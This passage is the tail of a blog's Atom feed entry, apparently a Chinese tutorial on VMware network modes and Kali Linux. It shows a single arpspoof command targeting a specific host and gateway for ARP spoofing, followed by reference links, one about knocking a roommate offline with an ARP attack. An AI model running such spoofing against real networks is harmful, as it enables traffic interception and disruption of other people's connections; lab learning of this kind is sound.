class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.42.115 192.168.1.1</span><br></pre></td></tr></table></figure><p>参考：</p><ol><li><a href="https://www.cnblogs.com/systemnet123/articles/2640883.html" target="_blank" rel="noopener">VMware Network Adapter VMnet1/8详解</a></li><li><a href="https://www.cnblogs.com/aeolian/p/8882790.html" target="_blank" rel="noopener">VMWare虚拟机网络配置</a>（图文并茂，讲得很清晰）</li><li><a href="https://www.cnblogs.com/systemnet123/articles/2640883.html" target="_blank" rel="noopener">VMware虚拟机Bridged(桥接模式)</a></li><li><a href="https://blog.csdn.net/gw_csdn/article/details/84992696" target="_blank" rel="noopener">解决kali桥接模式无法上网</a>(这篇写的非常好)</li><li><a href="https://blog.csdn.net/weixin_42578412/article/details/84780401" target="_blank" rel="noopener">使用kali对舍友进行ARP断网攻击</a></li><li><a href="https://www.freebuf.com/articles/web/160511.html" target="_blank" rel="noopener">ARP协议分析&amp;python编程实现ARP欺骗抓图片</a></li></ol>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1&gt;VMWare 网络基础知识&lt;/h1&gt;
-&lt;blockquote&gt;
-&lt;p&gt;要进入或离开全屏模式，请按Ctrl+Alt+Enter。&lt;br&gt;
-要切换到前一个全屏虚拟机，请按Ctrl+Alt+向左箭头键。&lt;br&gt;
-要切换到下一个全屏虚拟机，请按Ctrl+Alt+向右箭头键。&lt;/p
-      
-    
-    </summary>
-    
-    
-      <category term="Web" scheme="https://zer0-nu1l.github.io/categories/Web/"/>
-    
-    
-      <category term="kali" scheme="https://zer0-nu1l.github.io/tags/kali/"/>
     
   </entry>
   
